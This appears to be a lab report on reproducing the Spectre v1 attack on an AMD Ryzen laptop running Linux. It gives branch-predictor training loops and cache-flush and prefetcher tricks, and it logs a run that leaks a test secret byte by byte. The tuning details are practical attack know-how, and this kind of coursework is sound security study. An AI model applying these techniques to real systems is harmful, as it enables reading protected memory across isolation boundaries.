# Spectre Attack Report

## Branch predictor training
Global and local branch predictor trainers were run one after another and repeated 16 times.
### Global branch predictor
To trained the global branch predictor I run following function:
```c
for (volatile int i = 0; i < 99; i++){
    for (volatile int j = 0; j < 198; j++){
        for (volatile int k = 0; k < 57; k++){
        }
    }
}
```
Running single loop did not provided needed results, moreover running 2 loops was still not enough. Nor was running 3 loops with all having number of iterations divisible by 4.
Only after I switched the number of iterations each to be different number modulo 4 the attack started to work.

### Local branch predictor
To trained the local branch predictor I run following function:
```c
for (int j = 0; j < 16; j++) {
    victim_function(j);
}
```
The loop runs `victim_function` for each valid argument.


## Side channel extension
To extend the time available I flushed cache line containing array1_size so that it has to be fetched from DRAM.

## Attack accuracy improvements
1. Attack has been run 1000 times to improve accuracy. 
2. Branch predictor training has been run 16 times.

The difference between best and second best results is for most of the letter over ten fold so I was happy tith the result.

## Additional problems
I had to use `shuffle_map.h` to prevent prefetcher from kicking in.

## Appendix
### Logs from successful attempt
```
Putting 'The Magic Words are Squeamish Ossifrage.' in memory, address 0x6042f55cf420
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffffe3c0... Success: 0x54='T' score=179 (second best: 0x4A='J' score=2)
Reading at malicious_x = 0xffffffffffffe3c1... Success: 0x68='h' score=90 (second best: 0x4A='J' score=6)
Reading at malicious_x = 0xffffffffffffe3c2... Success: 0x65='e' score=91 
Reading at malicious_x = 0xffffffffffffe3c3... Success: 0x20=' ' score=91 
Reading at malicious_x = 0xffffffffffffe3c4... Success: 0x4D='M' score=4 
Reading at malicious_x = 0xffffffffffffe3c5... Success: 0x61='a' score=6 
Reading at malicious_x = 0xffffffffffffe3c6... Success: 0x67='g' score=17 (second best: 0x4A='J' score=1)
Reading at malicious_x = 0xffffffffffffe3c7... Success: 0x69='i' score=65 (second best: 0x23='#' score=1)
Reading at malicious_x = 0xffffffffffffe3c8... Success: 0x63='c' score=108 
Reading at malicious_x = 0xffffffffffffe3c9... Success: 0x20=' ' score=43 (second best: 0x00='?' score=1)
Reading at malicious_x = 0xffffffffffffe3ca... Success: 0x57='W' score=68 (second best: 0x95='?' score=8)
Reading at malicious_x = 0xffffffffffffe3cb... Success: 0x6F='o' score=151 (second best: 0x4A='J' score=1)
Reading at malicious_x = 0xffffffffffffe3cc... Success: 0x72='r' score=9 (second best: 0x23='#' score=1)
Reading at malicious_x = 0xffffffffffffe3cd... Success: 0x64='d' score=27 (second best: 0x4A='J' score=1)
Reading at malicious_x = 0xffffffffffffe3ce... Success: 0x73='s' score=19 (second best: 0x55='U' score=9)
Reading at malicious_x = 0xffffffffffffe3cf... Success: 0x20=' ' score=18 (second best: 0x4A='J' score=1)
Reading at malicious_x = 0xffffffffffffe3d0... Success: 0x61='a' score=21 (second best: 0x4A='J' score=1)
Reading at malicious_x = 0xffffffffffffe3d1... Success: 0x72='r' score=17 (second best: 0x23='#' score=1)
Reading at malicious_x = 0xffffffffffffe3d2... Success: 0x65='e' score=21 
Reading at malicious_x = 0xffffffffffffe3d3... Success: 0x20=' ' score=54 (second best: 0x4A='J' score=6)
Reading at malicious_x = 0xffffffffffffe3d4... Success: 0x53='S' score=34 
Reading at malicious_x = 0xffffffffffffe3d5... Success: 0x71='q' score=30 (second best: 0x4A='J' score=2)
Reading at malicious_x = 0xffffffffffffe3d6... Success: 0x75='u' score=32 (second best: 0x4A='J' score=1)
Reading at malicious_x = 0xffffffffffffe3d7... Success: 0x65='e' score=21 
Reading at malicious_x = 0xffffffffffffe3d8... Success: 0x61='a' score=10 
Reading at malicious_x = 0xffffffffffffe3d9... Success: 0x6D='m' score=33 
Reading at malicious_x = 0xffffffffffffe3da... Success: 0x69='i' score=21 (second best: 0x55='U' score=4)
Reading at malicious_x = 0xffffffffffffe3db... Success: 0x73='s' score=6 
Reading at malicious_x = 0xffffffffffffe3dc... Success: 0x68='h' score=9 
Reading at malicious_x = 0xffffffffffffe3dd... Success: 0x20=' ' score=53 (second best: 0x12='?' score=1)
Reading at malicious_x = 0xffffffffffffe3de... Success: 0x4F='O' score=25 (second best: 0x23='#' score=1)
Reading at malicious_x = 0xffffffffffffe3df... Success: 0x73='s' score=50 (second best: 0x12='?' score=1)
Reading at malicious_x = 0xffffffffffffe3e0... Success: 0x73='s' score=23 
Reading at malicious_x = 0xffffffffffffe3e1... Success: 0x69='i' score=7 (second best: 0x4A='J' score=1)
Reading at malicious_x = 0xffffffffffffe3e2... Success: 0x66='f' score=11 (second best: 0x4A='J' score=2)
Reading at malicious_x = 0xffffffffffffe3e3... Success: 0x72='r' score=11 
Reading at malicious_x = 0xffffffffffffe3e4... Success: 0x61='a' score=10 (second best: 0x23='#' score=1)
Reading at malicious_x = 0xffffffffffffe3e5... Success: 0x67='g' score=9 (second best: 0x23='#' score=2)
Reading at malicious_x = 0xffffffffffffe3e6... Success: 0x65='e' score=12 (second best: 0x23='#' score=1)
Reading at malicious_x = 0xffffffffffffe3e7... Success: 0x2E='.' score=13 
```

### System
#### Operating system
Garuda Linux distribution with Linux 6.9.3 kernel
#### lscpu
```
Architecture:             x86_64
CPU op-mode(s):         32-bit, 64-bit
Address sizes:          48 bits physical, 48 bits virtual
Byte Order:             Little Endian
CPU(s):                   16
On-line CPU(s) list:    0-15
Vendor ID:                AuthenticAMD
Model name:             AMD Ryzen 7 5700U with Radeon Graphics
CPU family:           23
Model:                104
Thread(s) per core:   2
Core(s) per socket:   8
Socket(s):            1
Stepping:             1
CPU(s) scaling MHz:   25%
CPU max MHz:          4372,0000
CPU min MHz:          400,0000
BogoMIPS:             3594,00
Flags:                fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx
fxsr sse sse2 ht syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good
nopl xtopology nonstop_tsc cpuid extd_apicid aperfmperf rapl pni pclmulqdq monitor s
sse3 fma cx16 sse4_1 sse4_2 movbe popcnt aes xsave avx f16c rdrand lahf_lm cmp_legac
y svm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ibs skinit wdt tce
topoext perfctr_core perfctr_nb bpext perfctr_llc mwaitx cpb cat_l3 cdp_l3 hw_pstat
e ssbd mba ibrs ibpb stibp vmmcall fsgsbase bmi1 avx2 smep bmi2 cqm rdt_a rdseed adx
smap clflushopt clwb sha_ni xsaveopt xsavec xgetbv1 cqm_llc cqm_occup_llc cqm_mbm_t
otal cqm_mbm_local clzero irperf xsaveerptr rdpru wbnoinvd cppc arat npt lbrv svm_lo
ck nrip_save tsc_scale vmcb_clean flushbyasid decodeassists pausefilter pfthreshold
avic v_vmsave_vmload vgif v_spec_ctrl umip rdpid overflow_recov succor smca
Virtualization features:
Virtualization:         AMD-V
Caches (sum of all):
L1d:                    256 KiB (8 instances)
L1i:                    256 KiB (8 instances)
L2:                     4 MiB (8 instances)
L3:                     8 MiB (2 instances)
NUMA:
NUMA node(s):           1
NUMA node0 CPU(s):      0-15
Vulnerabilities:
Gather data sampling:   Not affected
Itlb multihit:          Not affected
L1tf:                   Not affected
Mds:                    Not affected
Meltdown:               Not affected
Mmio stale data:        Not affected
Reg file data sampling: Not affected
Retbleed:               Mitigation; untrained return thunk; SMT enabled with STIBP protection
Spec rstack overflow:   Mitigation; Safe RET
Spec store bypass:      Mitigation; Speculative Store Bypass disabled via prctl
Spectre v1:             Mitigation; usercopy/swapgs barriers and __user pointer sanitization
Spectre v2:             Mitigation; Retpolines; IBPB conditional; STIBP always-on; RSB filling; PBRSB-eIBRS
Not affected; BHI Not affected
Srbds:                  Not affected
Tsx async abort:        Not affected
```